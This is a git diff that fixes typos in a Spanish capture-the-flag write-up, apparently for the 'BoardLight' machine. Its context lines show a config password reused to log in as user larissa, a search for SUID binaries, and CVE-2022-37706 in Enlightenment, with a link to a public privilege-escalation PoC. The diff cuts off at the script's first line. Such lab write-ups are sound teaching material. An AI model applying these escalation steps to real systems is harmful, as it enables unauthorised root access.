@@ -178,7 +178,7 @@ $dolibarr_main_distrib='standard';
 ```
 {: file="conf.php"}
 
-Accediando al MySQL con las credenciales no podremos encontrar nada interesante además de dos hashes que no parecen ser de contraseñas débiles, pero probando esta contraseña con el usuario larissa nos permite acceder como él:
+Accediendo al MySQL con las credenciales no podremos encontrar nada interesante además de dos hashes que no parecen ser de contraseñas débiles, pero probando esta contraseña con el usuario larissa nos permite acceder como él:
 
 ```bash
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
@@ -245,7 +245,7 @@ larissa@boardlight:~/Downloads$ find / -perm -4000 2>/dev/null
 /usr/bin/vmware-user-suid-wrapper
 ```
 
-Viendo la propiedad de los `enlightment`:
+Viendo la propiedad de los `enlightenment`:
 
 ```bash
 larissa@boardlight:~/Downloads$ ls -la /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment*
@@ -260,7 +260,7 @@ larissa@boardlight:~/Downloads$ ls -la /usr/lib/x86_64-linux-gnu/enlightenment/u
 -rwxr-xr-x 1 root root  35128 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_thumb
 ```
 
-`Enlightenment` es un gestor de ventanas que funciona ya sea en X11 o Wayland, y buscando por vulnerabilidades encontraremos el CVE-2022-37706:
+Enlightenment es un gestor de ventanas que funciona ya sea en X11 o Wayland, y buscando por vulnerabilidades encontraremos el CVE-2022-37706:
 
 > The Enlightenment Version: 0.25.3 is vulnerable to local privilege escalation.
 > Enlightenment_sys in Enlightenment before 0.25.3 allows local users to
@@ -268,7 +268,7 @@ larissa@boardlight:~/Downloads$ ls -la /usr/lib/x86_64-linux-gnu/enlightenment/u
 > and the system library function mishandles pathnames that begin with a
 > /dev/.. substring
 
-Podemos encontrar un PoC público para abusar de la vulnerabilidad, y análizandolo podemos ver que es muy sencillo... ([tomado de acá](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit))
+Podemos encontrar un PoC público para abusar de la vulnerabilidad, y analizándolo podemos ver que es muy sencillo... ([tomado de acá](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit))
 
 ```bash
 #!/bin/bash
